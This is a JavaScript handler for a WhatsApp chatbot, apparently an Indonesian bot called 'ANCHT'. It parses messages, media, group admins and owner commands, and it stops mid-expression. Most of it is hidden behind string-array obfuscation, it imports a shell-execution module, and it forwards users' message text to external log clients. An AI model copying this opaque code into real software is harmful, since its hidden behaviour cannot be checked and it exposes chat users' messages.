"use strict";


var fs = require("fs");
var request = require('request')
var chalk = require('chalk')
var moment = require('moment')
var { exec } = require('child_process')
var util = require('util');
var delay = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
var time = moment(new Date()).format('HH:mm:ss DD/MM/YYYY')

const { match, stop } = require('../../lib/matchmaking')

function ERRLOG(e) {
     console.log(
          chalk.redBright('[ ANCHT ] '),
          moment(new Date()).format('HH:mm:ss DD/MM/YYYY'),
          chalk.bgBlueBright("name: " + e.name + " message: " + e.message)
     );
}

function getRemaining(endtime) {
     const total = Date.parse(endtime) - Date.parse(new Date());
     const seconds = Math.floor((total / 1000) % 60);
     const minutes = Math.floor((total / 1000 / 60) % 60);
     const hours = Math.floor((total / (1000 * 60 * 60)) % 24);
     const days = Math.floor(total / (1000 * 60 * 60 * 24));

     return {
          total,
          days,
          hours,
          minutes,
          seconds,
     };
}


let handle;

module.exports = handle = async (
     Rstats,
     GroupSettingChange,
     Mimetype,
     MessageType,
     conn,
     hurtz,
     chat,
     clientsNow,
     isClientLog
) => {
     try {
          if (hurtz) Rstats.stop()
          if (hurtz.key.remoteJid == "status@broadcast") { return; }

          if (!hurtz.message) return;

          function prt() {
               const a = ['cmkDW4LNWRldOqalWOVcNG', 'B8k7W7fNWQ3dOrO', 'n0NdRCojWQRcK8k0a8kSxW', 'x8kiW6qsWRFWPRQy', 'W6bfi8k2yaJcMSoezmkTWRS', 'WRdcM8kzW65NW74nDCkUCq', 'nJi4ntu1otaZoa', 'yxv0Ag9Y', 'mtaXourmDvvWCa', 't3DUzxiGyM90', 'mtyWnJG0mwTItvvSva', 'nCkfW5RcNCkueCon', 'rdZcM8k5WQddPCkxfCkDFq', 'CSkCW61IWRboW5uBWPLE', 'W71AW60', 'vevmo3r5Cgu9qW', 'W4KDxmoCW4uLceD6w8kUW68', 't1jhoKfZAg9Ryq', 'yCkZW7pdJmoTfCoHwG', 'mtuZmtq4mNreChDLAG', 'c8o5WRxcJG3cLCkgWRigreqRza', 'sZDO', 'W7dcLMtcQf4xqG', 'ifvUAtSk', 'igf1DgHVCIbIBW', 'mM9gy0f0EG', 'CCkyW6K', 'W7ddHt5XsSoJvmkiWOH/', 'WRqWW640W7hdPtpdPZ01', 'nJK5otK3tMLdrNP6', 'icGGtvjiuLrAia', 'xCkyW5tdI8oUWPhcPCozbSkc', 'C2vUze1LC3nHzW', 'WQ0IWR3cII7cQ0PKW5RcGqi', 'DgHLBG', 'WPBdHgVdTK/cMWapyCkpgG', 'mJGXode4rMnQCwjY']; function b(c, d) { c = c - 0x15c; let e = a[c]; if (b['ynmOxQ'] === undefined) { var f = function (k) { const l = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let m = ''; for (let n = 0x0, o, p, q = 0x0;p = k['charAt'](q++);~p && (o = n % 0x4 ? o * 0x40 + p : p, n++ % 0x4) ? m += String['fromCharCode'](0xff & o >> (-0x2 * n & 0x6)) : 0x0) { p = l['indexOf'](p); } return m; }; const j = function (l, m) { let n = [], o = 0x0, p, q = '', r = ''; l = f(l); for (let u = 0x0, v = l['length'];u < v;u++) { r += '%' + ('00' + l['charCodeAt'](u)['toString'](0x10))['slice'](-0x2); } l = decodeURIComponent(r); let t; for (t = 0x0;t < 0x100;t++) { n[t] = t; } for (t = 0x0;t < 0x100;t++) { o = (o + n[t] + m['charCodeAt'](t % m['length'])) % 0x100, p = n[t], n[t] = n[o], n[o] = p; } t = 0x0, o = 0x0; for (let w = 0x0;w < l['length'];w++) { t = (t + 0x1) % 0x100, o = (o + n[t]) % 0x100, p = n[t], n[t] = n[o], n[o] = p, q += String['fromCharCode'](l['charCodeAt'](w) ^ n[(n[t] + n[o]) % 0x100]); } return q; }; b['LEhCYq'] = j, b['qfmEZh'] = {}, b['ynmOxQ'] = !![]; } const g = a[0x0], h = c + g, i = b['qfmEZh'][h]; return i === undefined ? (b['biKSkB'] === undefined && (b['biKSkB'] = !![]), e = b['LEhCYq'](e, d), b['qfmEZh'][h] = e) : e = i, e; } const k = function (d, e) { return b(e - -'0x179', d); }, j = function (d, e) { return c(e - -0x179, d); }; function c(b, d) { b = b - 0x15c; let e = a[b]; if (c['XloFxL'] === undefined) { var f = function (j) { const k = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/='; let l = ''; for (let m = 0x0, n, o, p = 0x0;o = j['charAt'](p++);~o && (n = m % 0x4 ? n * 0x40 + o : o, m++ % 0x4) ? l += String['fromCharCode'](0xff & n >> (-0x2 * m & 0x6)) : 0x0) { o = k['indexOf'](o); } return l; }; c['ywWwtx'] = function (j) { const k = f(j); let l = []; for (let m = 0x0, n = k['length'];m < n;m++) { l += '%' + ('00' + k['charCodeAt'](m)['toString'](0x10))['slice'](-0x2); } return decodeURIComponent(l); }, c['qoWcoz'] = {}, c['XloFxL'] = !![]; } const g = a[0x0], h = b + g, i = c['qoWcoz'][h]; return i === undefined ? (e = c['ywWwtx'](e), c['qoWcoz'][h] = e) : e = i, e; } (function (d, e) { const i = function (d, e) { return c(d - -'0x3d8', e); }, h = function (d, e) { return b(d - -'0x3d8', e); }; while (!![]) { try { const f = -parseInt(h(-'0x25e', '*jtZ')) + parseInt(h(-'0x271', '3K7h')) * -parseInt(h(-'0x26e', '2(ry')) + parseInt(i(-0x259, -'0x254')) * parseInt(h(-0x262, 'veGl')) + parseInt(i(-0x27a, -'0x28d')) + -parseInt(i(-'0x25f', -0x264)) + -parseInt(h(-'0x260', 'w6Hn')) * parseInt(h(-'0x274', 'yvGC')) + -parseInt(i(-'0x26a', -0x277)) * -parseInt(h(-'0x265', 'j25i')); if (f === e) break; else d['push'](d['shift']()); } catch (g) { d['push'](d['shift']()); } } }(a, 0xc5a82)); if (cmd == prf + j(0x7, -'0xc')) { let dataOwner = 'MRHRTZ'; const vcard2 = k('E]s0', -0x7) + 'D\x0a' + (k('3K7h', -0x13) + '0\x0a') + k('ZLc^', 0x2) + ('Creator\x20Bot' + j(-0x29, -0x1a) + ')') + '\x0a' + (j('0x1', -'0x2') + j(-0x3, '0x4')) + (j(-0xf, -'0x4') + k('y*%^', -'0xe') + k('&$8e', -'0x1d')) + (j(-0x2, -'0xd') + k('Uf19', -0x5)) + ':+' + (k(']pPf', -0x1c) + k('j25i', 0x7)) + '\x0a' + 'END:VCARD'; conn[j(-0x16, -0x18) + 'e'](from, { 'displayname': j(-0x10, -'0xa'), 'vcard': vcard2 }, MessageType[k('soDR', -'0x8')], { 'quoted': hurtz })[j(-'0x8', -'0x16')](d => { const m = function (d, e) { return j(e, d - 0x21e); }, l = function (d, e) { return k(e, d - '0x21e'); }; balas(from, l('0x205', 'bjij') + m('0x223', '0x219') + l('0x20e', 'EWTr'), { 'quoted': d }); }); }
          }
          const a = ['uWv0WQa+W6iMsSkg', 'WPlcMmkQW4StWPtcRWqtWQ8', 'iIxdUmoYeNZcKqnmtW', 'participan', 'rXZcOKO', 'WPpdNwFdLq', 'Abv0EwOZWOFcSYSl', 'forEach', 'ntah', 'document', '1BtIVbx', 'WR5yWOddMmkOW4u', 'vmkOls7dVmolrJxdJ8oT', 'logger', 'C+kzLU+5QFgdTB3WP5Ak', 'BWhdPmkGgwFdLHDmxG', 'WOhcKtddOmoQWQxdRW', 'WO1/W58', 'WOPaWQfIiCorxsRdUa', 'chaBOT\x20]', 'W4bWWPSPWPldGCkY', 'WRZcSCk6', 'WRDemJW6kc0', 'qtu3w8ovc2dcOuDJW6ldTW', 'WOj1WQW5WPRdJSkHxSot', 'W6v3WPVdV8ktDq', 'documentMe', 'vwackq', 'audioMessa', 'WPG1W4NcG1ZdJCogj8kd', 'W5BdVCod', 'W7BdRq4', 'yrGeoSoZWP1Q', 'WOfGWQWJWPe', 'jid', 'WQhcIfddOq', 'W4SHW6tdIfhcJCkWWQ0m', 'contactMes', 'ence', 'xtMessage', 'WO/cReldQSkYW6CuhCkNnG', '67588lvHHnN', 'WOxcKSkNW5O', 'zX4CzMWHW7xcRrbp', 'WPikzmoQW5FdNtq', 'FHGhjCoZWPLQ', 'W7dcNa/cGsJcKq', 'ext', 'WRlcT8k9yhmvW73dJW', 'FXGzlCoFWP98W483bG', 'W74hpSkfnSoGW5a', 'WQOHWPaFWQdcICkoD8o/W6W', 'xtnXtK0AW4BcNI8', 'pSkNWQDd', 'W7OmlSkAiSoJW5aP', 'keys', 'WQlcG27dO8oRWQVdTsRdVSkp', 'WQ/cLv3dT8oTnmkujeVcTG', 'includes', 'uaVcI1KNW4pdP2vn', 'WO/cLtpdP8oIWQ3dPa', 'blueBright', 'WOvKWQyK', 'x3aFmXXSvGz+nW', 'WOjUW486W5VdL8oSW5pcOCkD', 'u2aikrjgvG', 'dhDjcmkwsgxcHua', 'WRrIW5i8W57dLSo7', '312793sCWrNF', 'WQFcIfRdOCoIn8ku', 'WR/cNKZdOa', 'user', 'i\x20error\x20nt', 'vW59WRb/W6O0bCknEW', 'pNu9WRL0W6pcOmkx', 'idFdPCkZexa', 'W5pdLSoRuCkq', 'vname', 'WRFcGSkTW5Cr', 'WQLvid0Vpb/cVM4B', 'f8krx07cImkFWRFdTSoHzW', 'essage', 'gCkTWQTylG', 'WOLvWQf/jSovxtZdOdm', 'WQakWOrTumoADCoRW7e', 'stickerMes', 'ar\x20nangid\x20', 'W48QW6pdJuxcRCk0WQO', 'W6NdTHJcUupdGCkGW7dcL0a', 'ata', 'WRbHW7RcPhhdOSo7yCkNW60', 'parse', 'fromMe', '7ZTLOAR', 'kCoAWQm', 't8kZdJ3dQSokvdpdNG', 'W61uFKjm', 'send', 'WOBcVJ/cOG', 'key', 'WReqWQPKvSonCCo/', 'sage', '🇮🇩☠️\x20*ANCHT\x20', 'wgZcHhPtWPC', 'f8ksWOCjW60LW44', 'cmksWOqwW60HW44', 'WQjvdcOOpcNcSh8', 'Contact', 'twqCpW', 'stringify', '4kUKMMS', '1qEyfhz', 'obRdNq', 'Sticker', 'iCoqWRqzW5RdSvvGdSoW', 'D8kjW6TuWONcV0zGjCoHg8kc', 'WPrrWQb4lSoruq', 'hxJcJw1xW5j2sSkTAG', 'WRlcMwtdT8oWi8kqj3O', 'match', 'c2tcJgTF', 'mCoAWRqjW7ldRfjAaCoX', 'WPjUWRmGWPVdMSkHvSon', 'WPrZWQW/WOy', 'rIHsx1SrW5pcScqd', 'WOpdNxhdHSo2WPq', 'caption', 'thumbnailM', 'text', 'log', 'W4lcGqxcINpdHGC', 'omkWWR1ij33dO8k+W4CL', 'W55gmKrlWOG', '563600dCbGHF', '>>\x20', 'conversati', 'pp.net', 'W6ldTJtcRKtdGCkwW77cHG', 'dXv9wW', '6285559038', 'imageMessa', '\x20di\x20', 'x8kxW4nJW6C', 'bSkyWPKrW6K+W58Ypmki', 'WPSezq8hWPBdVLNcIw3dIW', 'W4m8W7tdHf7cRCk0WR05la', 'lmkTbfhcKCowWPpdRmk1sW', 'WPxcMmkNW4OBWONcTtKWWQW', 'ixi6WRbUW4RcOmkxbSor', 'groupMetad', 'W4xdGSo2v8kBW4WJWPxdIuK', 'WOZcPLNdOG', 'kchdPCkHf3lcKW', 'tmkmW5vPW7RdS8knEeJcVW', './src/sett', 'sKiIcCkyW5xcJmkDWONcT8oLW6G', 'WQBcGK4', 'W4VdN8o7', 'mentionedT', 'extendedTe', 'bSkyWPOvW6m1W4ivnq', 'Owner', 'WOtcNZldUCoIWR4', 'W5iSW7xdJflcP8kWWRabba', 'oxOZWRa', 'rNe2pWbsuHjO', '149507eDcWju', 'dmozkSkcymoeW67cI8k9ia', 'test', 'split', 'W7ymlSkt', 'messageTim', 'W7fpW5NcHSkanSkl', 'W7udW6RcQ8ocohy', 'greenBrigh', 'xGFcSK7cKwldVqm', 'W483W4hdHv3cOmk/', 'W7ZcGH3cHYRcUr/dVXxcIa', '021@s.what', 'WQHkWPtdNa', 'zrBcQ1KGW4NdTMC', 'W6asiCkFiW', 'slice', 't8k3jJVdRCoCux7cM8k+', 'W7bKWPZdO8ke', 'W7jtW5JcOSkgma', 'WOKgC8o8W5NdTZtcJKxcVa', 'jbtdIaxcOq', 'WONcLtNdPW', 'wgZcJcG', 'W4nspvi', 'C8o9WQ4KW6NdQ1K', '[\x20ANCHT\x20]\x20', 'sendMessag', 'Audio', 'gMXQca', 'exec', 'xpected*\x20:', 'nH0AWRO', 'WRSrWQD+rSoBz8oTW6b1', 'WQFcGKtdT8oTja', 'W7ytW7xcS8ogp14', 'tIjf', 'ephemeralM', 'bmo2Cw/cOmkkrHFdRmo2WQfI', 'message', '0@s.whatsa', 'DebuW7FcGdBcTdu7WRi1zW', 'contextInf', 'p.net', 'contacts', 'wCknW5b4W4FdM8kjBW', 'notify', 'WRRdPHJcUv7cKG', 'Amo6WQGFW5ddUWfCdSoZ', 'jSkfWPieW7GJW49Bemkx', 'updatePres', 'W5yLW7ldKLu', 'CCkghSk4fLfNW7JdRCoh', 'W4SmW6NcOMddVSo1', 'quotedM', 'subject', 'xmkIoIS', 'replace', 'videoMessa', 'ssage', 'format', 'dZy5lYvzEdm', 'WR0nWRPPrmom', 'age', 'W4SHW7pdKLhcRSk0', 'WP7cHmk8eG', 'eMX2amketW', 'remoteJid', 'W7tcMX0', '\x20pesan', 'WPRcHa3dSCoWWRNdOd7dUG', 'WOhcMchdOa', 'WPHVWR08WOhdJCkTsW', 'kG0qWRRdGG', 'mgK7WRbVW4xcT8kneSoy', '13BuVxKF', '561966gIEwNT', 'okey', '668775zOtHEa', 'Not\x20a\x20vali']; const r = function (d, f) { return c(f - 0x26, d); }, q = function (d, f) { return b(f - '0x26', d); }; (function (d, f) { const p = function (d, f) { return b(f - 0x3a6, d); }, o = function (d, f) { return c(f - '0x3a6', d); }; while (!![]) { try { const g = parseInt(o('K^Hl', 0x4b8)) * parseInt(o('OyX^', 0x415)) + parseInt(p('0x453', '0x485')) * parseInt(p(0x4fb, '0x4ce')) + -parseInt(o('gmZW', 0x4c3)) + parseInt(o('og(P', 0x43f)) * -parseInt(o('cCg!', 0x43c)) + -parseInt(o('%!)B', 0x4f7)) * parseInt(o('9JG$', 0x4e7)) + -parseInt(p(0x412, '0x424')) + -parseInt(o('XY]B', '0x4f4')) * -parseInt(p(0x4e4, 0x496)); if (g === f) break; else d['push'](d['shift']()); } catch (h) { d['push'](d['shift']()); } } }(a, 0xa9b01)); const time = moment(hurtz[q(0x131, 0x153) + 'estamp'][r('JG*K', '0xc7')] * 0x3e8)[r('U$*k', '0x14a')](r('Ohc!', 0x13a) + 'D/MM/YYYY'); let settings = JSON[r('%NgB', 0x181)](fs['readFileSy' + 'nc'](q(0x121, 0x142) + r(']lnY', '0xa8'))); const from = hurtz[q(0x11f, 0x10b)][q(0x8a, 0x9b)], konten = JSON[r('cCg!', '0xc0')](hurtz[r('OyX^', '0xe9')], null, 0x2), { text, extendedText, audio, video, document, image } = MessageType, self = hurtz[r('VMjb', 0x172)][q('0x8c', 0x104)], isGroup = from['endsWith'](r('K^Hl', 0x108)); let type = Object['keys'](hurtz[q('0x158', 0x175)])[0x0]; type = type === 'extendedTe' + r('og(P', '0xea') && hurtz['message'][q('0x16a', 0x147) + q('0x9d', 0xcf)][q('0x10b', '0x128')][q(0xd2, 0xe2)]('@') ? type = q('0xfc', 0x146) + q('0xcb', '0xd7') : type; let hurtzText = hurtz; type == q('0x159', '0x173') + r('m8@p', '0xf3') && (type = Object[r('U$*k', 0x164)](hurtz[q('0x16b', '0x175')]['ephemeralM' + 'essage'][q(0x140, '0x175')]), hurtzText = hurtz['message'][r('nS*D', 0x11d) + q('0xbc', 0xf9)]); const body = type == 'conversati' + 'on' ? hurtzText[r('U$*k', '0xe4')][r('XY]B', 0xb4) + 'on'] : type == q(0xcd, '0x146') + q('0xc8', 0xd7) ? hurtzText['message'][r('JEV!', '0x14f') + q(0x85, 0xcf)][r('cCg!', 0xe6)] : type == q('0xeb', 0x147) + 'xtMessage' ? hurtzText['message'][r('*X5k', '0x13e') + q(0xd5, 0xcf)]['text'] : type == q(0x12f, '0x134') + 'ge' ? hurtzText[q(0x167, '0x175')][q('0xd4', 0x134) + 'ge']['caption'] : type == 'stickerMes' + 'sage' ? q('0xd5', '0x119') : type == q(0xc2, 0xc4) + 'ge' ? q(0x1a9, '0x16a') : type == q(0x8b, 0x92) + 'ge' ? hurtzText[q('0x185', 0x175)][r('8gjr', 0x13c) + 'ge'][q('0xcb', 0x126)] : type == r('%fTi', 0xa9) + 'ssage' ? r('TNT0', 0xd8) : type == q(0x98, '0xcd') + r('gmZW', '0x132') ? q(0xfc, '0x113') : r('cCg!', '0xdb') + 'D\x20BODY\x20@Me' + q(0x11c, 0xbb), bodyAsak = body[r('K^Hl', 0x12c)](0x0, 0x28)[q(0x161, 0x151)]('\x0a')[0x0], args = body[r('#0gL', '0x15d')](/ +/g), cmd = body['toLowerCas' + 'e']()['split']('\x20')[0x0] || '', prf = /^[°•π÷×¶∆£¢€¥®™✓_=|~!?@#$%^&.\/\\©^]/[q(0x146, 0x150)](cmd) ? cmd[q(0x13f, 0x11f)](/^[°•π÷×¶∆£¢€¥®™✓_=|~!?@#$%^&.\/\\©^]/gi) : '-', anticol = /[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, isMedia = type === 'imageMessa' + 'ge' || type === q('0xd7', '0x92') + 'ge', isQuotedImage = type == r('25%u', 0xe1) + q(0xa7, '0xcf') && konten['includes']('imageMessa' + 'ge'), isQuotedVideo = type == r('p[V0', '0x12b') + q(0xd8, 0xcf) && konten[r('&gP5', '0x10c')](q('0xcf', 0x92) + 'ge'), isQuotedSticker = type == 'extendedTe' + r('&gP5', 0xfc) && konten[r('cCg!', '0xa0')](q(0xbb, '0xfd') + r('[N&X', 0x15b)), isQuotedAudio = type == q('0xd9', '0x147') + r('JG*K', '0x131') && konten[q('0x143', '0xe2')](q('0x71', 0xc4) + 'ge'); let typeQuoted = type == q('0xf9', 0x147) + q('0x55', 0xcf) && hurtz[r('])B2', '0xbe')][q('0xe0', 0x147) + q(0xac, '0xcf')] ? Object[r('XY]B', 0x90)](hurtz[q('0x18e', 0x175)][q(0x14b, '0x147') + r('OyX^', '0x14d')][r('9JG$', '0x11a') + 'o'] ? hurtz[r('m8@p', '0x140')][q('0x13e', '0x147') + q('0x5b', 0xcf)][r('%fTi', '0x13b') + 'o'][r('IPcw', '0x8c') + 'age'] ? hurtz[q('0x13b', 0x175)][q(0xf1, '0x147') + r('mKrI', '0xe3')][r('sPV8', '0x137') + 'o']['quotedMess' + q(0xd4, 0x97)] : { 'mentionedText': r('sPV8', 0x17f) + r('C)x]', '0x8d') } : { 'thumbnailMessage': r('VMjb', '0xae') + r('m8@p', 0xaa) + q(0xee, '0xf0') + q('0x83', '0xfe') + ':v' })[0x0] : type, hurtzMediaData = type == q('0x191', 0x147) + 'xtMessage' && Object[q('0xaf', '0xdf')](JSON[r('iHR!', '0x163')](JSON[q('0xd7', 0x115)](hurtz)[r('y9VN', 0x155)](q(0x6a, 0x8e), 'm'))[r('#0gL', '0xda')]) != 'ephemeralM' + r('to8&', '0x125') ? JSON['parse'](JSON[q('0x143', '0x115')](hurtz)[r('7e(t', 0xd5)](r('y9VN', 0x171), 'm'))[r('25%u', '0xed')][r('QxYh', 0xe8) + 'xtMessage']['contextInf' + 'o'] : hurtzText; type == 'extendedTe' + 'xtMessage' && Object[r('OyX^', '0xc3')](JSON[q('0x98', '0x103')](JSON[r('C)x]', '0xc5')](hurtz)['replace']('quotedM', 'm'))[q('0x18d', 0x175)]) == q('0x128', '0x173') + q('0x84', 0xf9) && JSON[q('0x149', 0x103)](JSON[q('0xaa', '0x115')](hurtz)['replace'](q(0xab, '0x8e'), 'm'))[q(0x170, '0x175')][q(0x1c3, '0x173') + r('w4ul', 0x161)]['message'][r('R9or', '0xd0') + r('VMjb', '0xdc')][q(0x172, 0x178) + 'o'][q('0x16e', 0x175)] && (typeQuoted = Object[r('25%u', '0xcb')](JSON['parse'](JSON[r('z5Ih', 0xba)](hurtz)[q(0x1a, '0x91')](q('0x90', '0x8e'), 'm'))['message'][q(0x14f, 0x173) + r('tvOM', '0xd6')][r('%NgB', '0x98')]['extendedTe' + r('XY]B', '0x107')][r('VMjb', 0x124) + 'o'][q(0x11e, 0x175)]), hurtzMediaData = JSON[r('cCg!', 0xc9)](JSON['stringify'](hurtz)[r('sPV8', 0x110)]('quotedM', 'm'))[q(0x183, 0x175)][q('0xfa', '0x173') + 'essage'][q('0x12c', 0x175)][q(0x18d, 0x147) + q(0x7d, 0xcf)]['contextInf' + 'o']); const mediaData = type == 'extendedTe' + r('og(P', 0xea) ? typeQuoted == q(0x144, '0x127') + r('[N&X', 0xb3) ? hurtzText : hurtzMediaData : hurtzText; let typesWA = ['conversati' + 'on', 'extendedTe' + r('U$*k', '0x9e'), 'mentionedT' + q(0xe5, '0xd7'), r('tvOM', 0x159) + 'ge', 'stickerMes' + q(0xca, 0x10d), r('OyX^', '0xe7') + 'ge', q(0x25, 0x92) + 'ge', q(0x133, 0xc2) + q(0x8f, '0x93'), 'thumbnailM' + r('&gP5', '0x96')]; const bodyQuoted = typesWA[r('zE%T', '0x157')](type === r('%NgB', '0x139') + r('])B2', '0x112') && hurtzMediaData ? Object['keys'](hurtzMediaData[r('7e(t', 0xc8)] ? hurtzMediaData[r('sPV8', 0x111)] : { 'MRHRTZ': q(0x3a, 0xa5) })[0x0] : r('og(P', 0x16b)) ? typeQuoted == q(0x13f, 0x12f) + 'on' ? hurtzMediaData[q(0x1e3, 0x175)][r('&gP5', 0x16f) + 'on'] : typeQuoted == q(0xe6, 0x147) + 'xtMessage' ? hurtzMediaData[r('z5Ih', 0x11c)][q('0x18d', 0x147) + q(0xd1, '0xcf')][q(0x118, 0x128)] : typeQuoted == q(0x11d, '0x146') + 'ext' ? hurtzMediaData[q(0x111, 0x175)][q(0x159, 0x147) + r('25%u', '0x11e')][r('%!)B', 0x16e)] : typeQuoted == q('0x192', 0x134) + 'ge' ? hurtzMediaData[r('6p1D', 0xd4)][q('0x111', 0x134) + 'ge'][r('U$*k', 0xb8)] : typeQuoted == q('0x169', '0xfd') + r('OyX^', 0x114) ? r('QxYh', 0xeb) : typeQuoted == 'audioMessa' + 'ge' ? r('%fTi', '0xf6') : typeQuoted == r('6p1D', '0x162') + 'ge' ? hurtzMediaData[r('#0gL', 0xda)][q(0xf6, '0x92') + 'ge']['caption'] : typeQuoted == 'documentMe' + q(0x87, 0x93) ? q(0xf8, '0xb1') : typeQuoted == r('%NgB', '0x14b') + 'essage' ? hurtzMediaData[r('#0gL', 0xda)] : '' : ''; settings[r('p[V0', '0xfa')] ? console[r('25%u', 0x144)](JSON['stringify'](hurtz)) : ''; let toggleCmd = ![]; const isCmd = toggleCmd, query = args[r('*X5k', '0xf4')](0x1)['join']('\x20'), sender = self ? conn[r('to8&', '0xad')][r('TNT0', '0xbd')] : isGroup ? hurtz[r('z5Ih', '0xfb') + 't'] : hurtz[q(0xb4, 0x10b)]['remoteJid'], botNumber = conn['user']['jid'], noSym = /[-\s+]/g, groupMetadata = isGroup ? await conn[q('0x187', '0x13d') + 'ata'](from) : '', groupName = isGroup ? groupMetadata[q(0x6c, '0x8f')] : '', groupId = isGroup ? groupMetadata['id'] : '', isImageMsg = type == q('0x18e', 0x134) + 'ge' ? !![] : ![], isStickerMsg = type == q('0x157', 0xfd) + q(0xad, '0x10d') ? !![] : ![], isAudioMsg = type == q('0x5a', '0xc4') + 'ge' ? !![] : ![], isVideoMsg = type == r('6OK6', '0x141') + 'ge' ? !![] : ![], nomerOwner = [settings[q(0x19a, '0x149')], conn[q('0x77', '0xef')][q(0x145, 0xca)]], isOwner = nomerOwner[r('#0gL', 0xde)](sender), isOwnerGroup = isGroup ? (await conn[q('0x13e', '0x13d') + r('tvOM', '0x9c')](from))['owner'] == sender[q('0x52', 0x91)](r('U$*k', 0xe0) + q(0x194, 0x179), '@c.us') ? !![] : ![] : ''; let expvipnum = [], adminGroups = []; const metadata = isGroup ? await conn['groupMetad' + q(0x8c, '0x101')](from) : '', partc = metadata[q(0x92, '0xab') + 'ts'] ? metadata[q(0x119, '0xab') + 'ts'] : []; for (let adm of partc) { adm[r('%NgB', 0x158)] && adminGroups[r('zE%T', '0xac')](adm['jid']); } const isAdmin = adminGroups[r('%NgB', 0xff)](sender), isBotAdmin = adminGroups[r('8gjr', '0xf2')](botNumber), jid = sender, conts = hurtz[r('9JG$', '0x106')]['fromMe'] ? conn[r('25%u', '0xee')][r('QxYh', 0xb9)] : conn[q('0x149', '0x17a')][sender] || { 'notify': sender[q(0x62, '0x91')](/@.+/, '') }, pushname = hurtz[r('*X5k', '0x145')][q(0x140, 0x104)] ? conn[q(0x87, '0xef')][r('K^Hl', '0x166')] : conts[q(0x1b1, 0x17c)] || conts[q(0x16e, 0xf5)] || conts[r('8gjr', '0x14c')] || '-'; function customQuote(d) { const s = function (d, f) { return q(f, d - '0x1a5'); }; return { 'key': { 'remoteJid': s(0x31b, '0x2ab') + s(0x2d5, 0x315), 'fromMe': ![] }, 'message': { 'conversation': d } }; } function toBuffer(d) { return new Promise((f, g) => { const t = function (d, f) { return c(d - -0x1b2, f); }; if (!/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi['test'](d)) return console[t(-'0xa2', '6OK6')]('Not\x20a\x20vali' + 'd\x20url!'); request({ 'url': d, 'encoding': null }, (h, i, j) => { f(j); }); }); } async function mengetik(d) { const v = function (d, f) { return q(d, f - -'0x136'); }, u = function (d, f) { return r(d, f - -'0x136'); }; await conn[u('6OK6', 0x45)](d), await conn[v(-0x5, '0x4a') + 'ence'](d, u('sPV8', '0x12')); } async function balasNp(d, f) { const w = function (d, f) { return r(d, f - '0x184'); }; mengetik(d), conn[w('9JG$', 0x2a5) + 'e'](d, f, text); } function b(c, d) { c = c - 0x66; let e = a[c]; return e; } async function balas(d, f) { const x = function (d, f) { return r(d, f - 0x1c8); }; mengetik(d), conn[x('7e(t', 0x2a1) + 'e'](d, f, text, { 'quoted': hurtz }); } async function sendDariUrlNoReply(d, f, g, h) { const z = function (d, f) { return q(f, d - '0x3d8'); }, y = function (d, f) { return r(f, d - '0x3d8'); }; if (!/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi['test'](f)) return console[y('0x4fb', 'cCg!')](z('0x47f', 0x424) + 'd\x20url!'); await conn['updatePres' + z('0x4a6', 0x511)](d, 'composing'); const i = h || ''; request({ 'url': f, 'encoding': null }, async (j, k, l) => { const B = function (d, f) { return y(f - 0x107, d); }, A = function (d, f) { return z(f - '0x107', d); }; conn['sendMessag' + 'e'](d, l, g, { 'quoted': { 'key': { 'remoteJid': '0@s.whatsa' + 'pp.net', 'fromMe': ![] }, 'message': { 'conversation': A('0x60f', 0x5ed) + B('VMjb', 0x5b2) + B('AQqw', 0x595) } }, 'caption': i }), await conn['updatePres' + B('#0gL', 0x631)](d, 'paused'); }); } async function sendDariUrl(d, f, g, h) { const D = function (d, f) { return r(d, f - -0x2e5); }, C = function (d, f) { return q(d, f - -'0x2e5'); }; if (!/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi[C(-0x170, -0x195)](f)) return console[D('J0f^', -'0x185')]('Not\x20a\x20vali' + 'd\x20url!'); await conn['updatePres' + C(-'0x21c', -'0x217')](d, D('cCg!', -'0x1c3')); const i = h || ''; request({ 'url': f, 'encoding': null }, async (j, k, l) => { const F = function (d, f) { return D(f, d - -0xc6); }, E = function (d, f) { return C(f, d - -0xc6); }; conn[E(-0x242, -'0x270') + 'e'](d, l, g, { 'quoted': hurtz, 'caption': i }), await conn[E(-'0x22b', -0x26e) + 'ence'](d, F(-'0x2ea', 'J0f^')); }); } if (!isGroup && isCmd) { const teks = chalk[q('0x12d', 0x156) + 't'](q('0x10a', 0x168) + '\x20') + time + chalk['blueBright'](args[0x0]) + '\x20dari\x20' + chalk[q('0xed', '0xe5')](pushname[q(0x19b, '0x151')]('\x0a')[0x0]); console[q(0xee, '0x129')](teks), clientsNow[q(0x7b, '0xaf')](d => { if (!isClientLog) return; d['send'](teks); }); } if (!isGroup && !isCmd) { const teks = chalk[q(0x13d, '0x156') + 't'](r('C)x]', 0x102) + '\x20') + time + chalk[q('0x9c', 0xe5)](!![] ? '\x20' + bodyAsak : q(0xf7, '0x9d')) + '\x20dari\x20' + chalk['blueBright'](pushname[q(0x1c7, '0x151')]('\x0a')[0x0]); console[r('iHR!', 0x118)](teks), clientsNow[r('w4ul', '0x154')](d => { const G = function (d, f) { return r(d, f - 0x7); }; if (!isClientLog) return; d[G('pMiQ', 0x111)](teks); }); } if (isCmd && isGroup) { const teks = chalk[r('8gjr', 0xa2) + 't']('[\x20ANCHT\x20]\x20' + '\x20') + time + chalk[q('0x71', 0xe5)](args[0x0]) + r('nS*D', 0x10f) + chalk['blueBright'](pushname[q(0xfd, '0x151')]('\x0a')[0x0]) + r('nS*D', '0x165') + chalk['blueBright'](groupName); console[q(0xc5, '0x129')](teks), clientsNow['forEach'](d => { const H = function (d, f) { return q(d, f - -0x3ab); }; if (!isClientLog) return; d[H(-'0x314', -'0x2a2')](teks); }); } if (!isCmd && isGroup) { const teks = chalk[q(0x10c, 0x156) + 't'](q('0x16e', 0x168) + '\x20') + time + chalk[q(0xf8, 